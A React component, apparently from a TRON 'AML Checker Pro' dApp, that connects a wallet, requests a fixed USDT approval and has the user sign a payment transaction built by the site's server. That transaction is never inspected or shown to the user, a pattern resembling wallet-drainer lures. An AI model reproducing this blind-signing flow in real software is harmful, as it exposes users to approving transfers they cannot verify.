import React, { useState, useEffect, useRef } from 'react';
import toast from 'react-hot-toast';

const TRON_USDT_CONTRACT  = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
const TRON_AML_CONTRACT   = 'TCrxH5b8bSMGtnK5hNjukzBHwy5cPZNtih';
const TRON_PAYMENT_AMOUNT = 1290000;
const TRONGRID_URL        = 'https://nile.trongrid.io';
const WC_PROJECT_ID       = '7a01fc0d75597c9ec6bb51608ad91767';

// ─── Все возможные источники tronWeb ─────────────────────────────────────────
const getTronWeb = () => {
  return (
    window.tronWeb ||
    (window.trustwallet && window.trustwallet.tronWeb) ||
    (window.trustwallet && window.trustwallet.tronLink && window.trustwallet.tronLink.tronWeb) ||
    (window.tronLink && window.tronLink.tronWeb) ||
    null
  );
};

const waitForTronWeb = () => new Promise((resolve, reject) => {
  const tw = getTronWeb();
  if (tw && tw.defaultAddress && tw.defaultAddress.base58) return resolve(tw);
  let elapsed = 0;
  const interval = setInterval(() => {
    const tw = getTronWeb();
    if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
      clearInterval(interval);
      return resolve(tw);
    }
    elapsed += 100;
    if (elapsed >= 10000) {
      clearInterval(interval);
      reject(new Error('TronWeb не обнаружен. Попробуйте через встроенный браузер TrustWallet.'));
    }
  }, 100);
});

const sendTronTransaction = async (txBuilderFn) => {
  const tronWeb = await waitForTronWeb();
  const fromAddress = tronWeb.defaultAddress.base58;

  let unsignedTx;
  try {
    unsignedTx = await txBuilderFn(tronWeb, fromAddress);
  } catch (err) {
    throw new Error('Ошибка при построении транзакции: ' + err.message);
  }

  if (!unsignedTx || !unsignedTx.txID) throw new Error('Не удалось создать транзакцию.');

  let signedTx;
  try {
    signedTx = await tronWeb.trx.sign(unsignedTx);
  } catch (err) {
    if (err && err.message && err.message.includes('Confirmation declined')) {
      throw new Error('Вы отклонили транзакцию.');
    }
    throw new Error('Ошибка подписи: ' + err.message);
  }

  if (!signedTx) throw new Error('Транзакция не подписана.');

  let txid;
  if (typeof signedTx === 'string') {
    txid = signedTx;
  } else if (signedTx && signedTx.txID) {
    txid = signedTx.txID;
    if (signedTx.signature) {
      const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
      if (!broadcast.result && broadcast.code !== 'DUP_TRANSACTION_ERROR') {
        throw new Error('Broadcast failed: ' + (broadcast.message || broadcast.code));
      }
    }
  } else {
    throw new Error('Неожиданный ответ от sign()');
  }

  return txid;
};

function encodeAddress(base58Addr) {
  const AB = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
  let n = BigInt(0);
  for (const ch of base58Addr) {
    const i = AB.indexOf(ch);
    if (i < 0) throw new Error('bad base58');
    n = n * BigInt(58) + BigInt(i);
  }
  return n.toString(16).padStart(50, '0').slice(2, 42);
}

function Spinner(props) {
  const size = props.size || 16;
  return React.createElement('span', {
    style: {
      display: 'inline-block', width: size, height: size,
      border: '2px solid rgba(255,255,255,0.3)',
      borderTopColor: '#fff', borderRadius: '50%',
      animation: 'spin 0.7s linear infinite', flexShrink: 0,
    }
  });
}

// ─── WalletConnect Modal ──────────────────────────────────────────────────────
let wcClient = null;
let wcSession = null;

const initWalletConnect = async () => {
  if (wcClient) return wcClient;
  const { SignClient } = await import('@walletconnect/sign-client');
  wcClient = await SignClient.init({
    projectId: WC_PROJECT_ID,
    metadata: {
      name: 'AML Checker Pro',
      description: 'Профессиональная AML проверка',
      url: 'https://aml-dapp-2.vercel.app',
      icons: ['https://aml-dapp-2.vercel.app/favicon.ico'],
    },
  });
  return wcClient;
};

const connectWalletConnect = async () => {
  const client = await initWalletConnect();
  const { WalletConnectModal } = await import('@walletconnect/modal');

  const modal = new WalletConnectModal({
    projectId: WC_PROJECT_ID,
    chains: ['tron:0x2b6653dc'],
  });

  const { uri, approval } = await client.connect({
    requiredNamespaces: {
      tron: {
        methods: ['tron_signTransaction', 'tron_signMessage'],
        chains: ['tron:0x2b6653dc'],
        events: [],
      },
    },
  });

  if (uri) {
    modal.openModal({ uri });
  }

  const session = await approval();
  modal.closeModal();
  wcSession = session;

  const accounts = session.namespaces.tron.accounts;
  const address = accounts[0].split(':')[2];
  return { client, session, address };
};

const signWithWalletConnect = async (transaction) => {
  if (!wcClient || !wcSession) throw new Error('WalletConnect не подключён');
  const chainId = 'tron:0x2b6653dc';
  const result = await wcClient.request({
    topic: wcSession.topic,
    chainId,
    request: {
      method: 'tron_signTransaction',
      params: { transaction },
    },
  });
  return result;
};

// ══════════════════════════════════════════════════════════════════════════════
// КОМПОНЕНТ
// ══════════════════════════════════════════════════════════════════════════════
export default function WalletConnect(props) {
  const onConnect        = props.onConnect;
  const onDisconnect     = props.onDisconnect;
  const onPaymentSuccess = props.onPaymentSuccess;

  const [address, setAddress]           = useState(null);
  const [connecting, setConnecting]     = useState(false);
  const [approving, setApproving]       = useState(false);
  const [paying, setPaying]             = useState(false);
  const [hasAllowance, setHasAllowance] = useState(false);
  const [txHash, setTxHash]             = useState(null);
  const [connType, setConnType]         = useState(null); // 'wc' или 'tronweb'

  // Автоподключение если tronWeb уже доступен
  useEffect(() => {
    let elapsed = 0;
    const interval = setInterval(() => {
      const tw = getTronWeb();
      if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
        clearInterval(interval);
        const addr = tw.defaultAddress.base58;
        console.log('[AutoConnect] tronWeb найден, адрес:', addr);
        setAddress(addr);
        setConnType('tronweb');
        onConnect && onConnect(addr);
        checkAllowanceTronWeb(tw, addr);
      }
      elapsed += 100;
      if (elapsed >= 3000) clearInterval(interval);
    }, 100);
    return () => clearInterval(interval);
  }, []);

  const checkAllowanceTronWeb = async (tw, addr) => {
    try {
      const usdtContract = await tw.contract().at(TRON_USDT_CONTRACT);
      const allowance = await usdtContract.allowance(addr, TRON_AML_CONTRACT).call();
      setHasAllowance(BigInt(allowance.toString()) >= BigInt(TRON_PAYMENT_AMOUNT));
    } catch (e) {
      console.error('[Allowance]', e.message);
      setHasAllowance(false);
    }
  };

  const checkAllowanceWC = async (addr) => {
    try {
      const ownerHex   = encodeAddress(addr);
      const spenderHex = encodeAddress(TRON_AML_CONTRACT).padStart(64, '0');
      const res = await fetch(TRONGRID_URL + '/wallet/triggerconstantcontract', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          owner_address:     '41' + ownerHex,
          contract_address:  '41' + encodeAddress(TRON_USDT_CONTRACT),
          function_selector: 'allowance(address,address)',
          parameter:         ownerHex.padStart(64, '0') + spenderHex,
          visible:           false,
        }),
      });
      const data = await res.json();
      const hex = data.constant_result && data.constant_result[0];
      const allowance = hex ? BigInt('0x' + hex) : BigInt(0);
      setHasAllowance(allowance >= BigInt(TRON_PAYMENT_AMOUNT));
    } catch (e) {
      console.error('[Allowance WC]', e.message);
      setHasAllowance(false);
    }
  };

  // ─── Подключение через WalletConnect ───────────────────────────────────────
  const handleConnect = async () => {
    setConnecting(true);
    try {
      const { address: addr } = await connectWalletConnect();
      console.log('[WalletConnect] подключён, адрес:', addr);
      setAddress(addr);
      setConnType('wc');
      onConnect && onConnect(addr);
      toast.success('Кошелёк подключён через WalletConnect');
      await checkAllowanceWC(addr);
    } catch (err) {
      console.error('[WalletConnect] ошибка:', err.message);
      toast.error(err.message);
    } finally {
      setConnecting(false);
    }
  };

  // ─── Approve ────────────────────────────────────────────────────────────────
  const handleApprove = async () => {
    setApproving(true);
    const tid = toast.loading('Подпишите approve в кошельке…');
    try {
      if (connType === 'wc') {
        // Строим транзакцию approve через TronGrid
        const ownerHex   = '41' + encodeAddress(address);
        const spenderHex = encodeAddress(TRON_AML_CONTRACT).padStart(64, '0');
        const amountHex  = TRON_PAYMENT_AMOUNT.toString(16).padStart(64, '0');
        const res = await fetch(TRONGRID_URL + '/wallet/triggersmartcontract', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            owner_address:     ownerHex,
            contract_address:  '41' + encodeAddress(TRON_USDT_CONTRACT),
            function_selector: 'approve(address,uint256)',
            parameter:         spenderHex + amountHex,
            fee_limit:         100000000,
            call_value:        0,
            visible:           false,
          }),
        });
        const data = await res.json();
        if (!data || !data.transaction) throw new Error('Не удалось построить approve');

        // Подписываем через WalletConnect
        const signed = await signWithWalletConnect(data.transaction);

        // Транслируем
        const broadcastRes = await fetch(TRONGRID_URL + '/wallet/broadcasttransaction', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(signed),
        });
        const broadcastData = await broadcastRes.json();
        if (!broadcastData.result && broadcastData.code !== 'DUP_TRANSACTION_ERROR') {
          throw new Error('Broadcast failed: ' + broadcastData.message);
        }
      } else {
        // tronWeb путь
        await sendTronTransaction(async (tronWeb, fromAddress) => {
          const ownerHex   = '41' + encodeAddress(fromAddress);
          const spenderHex = encodeAddress(TRON_AML_CONTRACT).padStart(64, '0');
          const amountHex  = TRON_PAYMENT_AMOUNT.toString(16).padStart(64, '0');
          const res = await fetch(TRONGRID_URL + '/wallet/triggersmartcontract', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              owner_address:     ownerHex,
              contract_address:  '41' + encodeAddress(TRON_USDT_CONTRACT),
              function_selector: 'approve(address,uint256)',
              parameter:         spenderHex + amountHex,
              fee_limit:         100000000,
              call_value:        0,
              visible:           false,
            }),
          });
          const data = await res.json();
          if (!data || !data.transaction) throw new Error('Не удалось построить approve');
          return data.transaction;
        });
      }

      toast.dismiss(tid);
      toast.success('Approve подтверждён!');
      setHasAllowance(true);
    } catch (err) {
      toast.dismiss(tid);
      toast.error('Ошибка approve: ' + err.message);
    } finally {
      setApproving(false);
    }
  };

  // ─── Pay ────────────────────────────────────────────────────────────────────
  const handlePay = async () => {
    setPaying(true);
    const tid = toast.loading('Оплата через контракт…');
    try {
      let txid;

      if (connType === 'wc') {
        // Получаем транзакцию с сервера
        const res = await fetch('/api/pay', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userAddress: address }),
        });
        const data = await res.json();
        if (!data || !data.transaction) throw new Error(data.error || 'Ошибка сервера');

        // Подписываем через WalletConnect
        const signed = await signWithWalletConnect(data.transaction);

        // Транслируем
        const broadcastRes = await fetch(TRONGRID_URL + '/wallet/broadcasttransaction', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(signed),
        });
        const broadcastData = await broadcastRes.json();
        if (!broadcastData.result && broadcastData.code !== 'DUP_TRANSACTION_ERROR') {
          throw new Error('Broadcast failed: ' + broadcastData.message);
        }
        txid = broadcastData.txid;
      } else {
        // tronWeb путь
        txid = await sendTronTransaction(async () => {
          const res = await fetch('/api/pay', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userAddress: address }),
          });
          const data = await res.json();
          if (!data || !data.transaction) throw new Error(data.error || 'Ошибка сервера');
          return data.transaction;
        });
      }

      setTxHash(txid);
      toast.dismiss(tid);
      toast.success('Оплата прошла! TX: ' + txid.slice(0, 14) + '…');
      onPaymentSuccess && onPaymentSuccess(txid, address);
    } catch (err) {
      toast.dismiss(tid);
      toast.error('Ошибка оплаты: ' + err.message);
    } finally {
      setPaying(false);
    }
  };

  const handleDisconnect = () => {
    if (connType === 'wc' && wcClient && wcSession) {
      wcClient.disconnect({
        topic: wcSession.topic,
        reason: { code: 6000, message: 'User disconnected' },
      }).catch(() => {});
      wcSession = null;
    }
    setAddress(null);
    setTxHash(null);
    setHasAllowance(false);
    setConnType(null);
    onDisconnect && onDisconnect();
  };

  const fmt = (a) => a.slice(0, 6) + '...' + a.slice(-4);
  const isBusy = connecting || approving || paying;
  const e = React.createElement;

  if (!address) {
    return e('div', { style: { display: 'flex', justifyContent: 'flex-end', marginBottom: '2rem' } },
      e('button', {
        onClick: handleConnect,
        disabled: connecting,
        style: {
          background: 'linear-gradient(135deg, #3b82f6, #60a5fa)',
          color: 'white', border: 'none', borderRadius: '40px',
          padding: '1rem 2rem', fontSize: '1rem', fontWeight: '600',
          cursor: connecting ? 'not-allowed' : 'pointer',
          display: 'flex', alignItems: 'center', gap: '0.8rem',
          opacity: connecting ? 0.7 : 1, transition: 'all 0.2s',
        }
      },
        connecting ? e(Spinner, null) : e('i', { className: 'fas fa-wallet' }),
        connecting ? 'Подключение...' : 'Подключить кошелёк'
      )
    );
  }

  return e('div', { style: { display: 'flex', justifyContent: 'flex-end', marginBottom: '2rem' } },
    e('div', { style: { display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '0.5rem' } },

      e('div', {
        style: {
          background: 'rgba(59,130,246,0.1)',
          border: '1px solid rgba(59,130,246,0.2)',
          borderRadius: '40px', padding: '0.8rem 1.5rem',
          display: 'flex', alignItems: 'center', gap: '1rem',
        }
      },
        e('i', { className: 'fas fa-check-circle', style: { color: '#10b981' } }),
        e('div', { style: { textAlign: 'right' } },
          e('div', { style: { color: '#60a5fa', fontFamily: 'monospace' } }, fmt(address)),
          e('div', { style: { fontSize: '0.65rem', color: '#a0b3d9' } },
            connType === 'wc' ? 'WalletConnect · TRON' : 'TronWeb · TRON'
          ),
          txHash
            ? e('a', {
                href: 'https://nile.tronscan.org/#/transaction/' + txHash,
                target: '_blank',
                rel: 'noopener noreferrer',
                style: { fontSize: '0.72rem', color: '#10b981', textDecoration: 'none' }
              }, 'Оплачено · Scan')
            : e('div', { style: { fontSize: '0.72rem', color: '#f59e0b' } }, 'Ожидание оплаты')
        ),
        e('button', {
          onClick: handleDisconnect,
          style: { background: 'none', border: 'none', color: '#ef4444', cursor: 'pointer' }
        }, e('i', { className: 'fas fa-sign-out-alt' }))
      ),

      !txHash && e('div', { style: { display: 'flex', gap: '0.5rem' } },
        !hasAllowance && e('button', {
          onClick: handleApprove,
          disabled: isBusy,
          style: {
            background: '#3b82f6', color: 'white', border: 'none',
            borderRadius: '40px', padding: '0.6rem 1.5rem',
            fontSize: '0.9rem', fontWeight: '600',
            cursor: isBusy ? 'not-allowed' : 'pointer',
            opacity: isBusy ? 0.7 : 1, transition: 'all 0.2s',
            display: 'flex', alignItems: 'center', gap: '0.5rem',
          }
        },
          approving ? e(Spinner, { size: 14 }) : 'Разрешить оплату'
        ),
        e('button', {
          onClick: handlePay,
          disabled: isBusy || !hasAllowance,
          style: {
            background: hasAllowance ? '#10b981' : '#9ca3af',
            color: 'white', border: 'none', borderRadius: '40px',
            padding: '0.6rem 1.5rem', fontSize: '0.9rem', fontWeight: '600',
            cursor: (!hasAllowance || isBusy) ? 'not-allowed' : 'pointer',
            opacity: (!hasAllowance || isBusy) ? 0.5 : 1, transition: 'all 0.2s',
            display: 'flex', alignItems: 'center', gap: '0.5rem',
          }
        },
          paying ? e(Spinner, { size: 14 }) : 'Оплатить'
        )
      )
    )
  );
}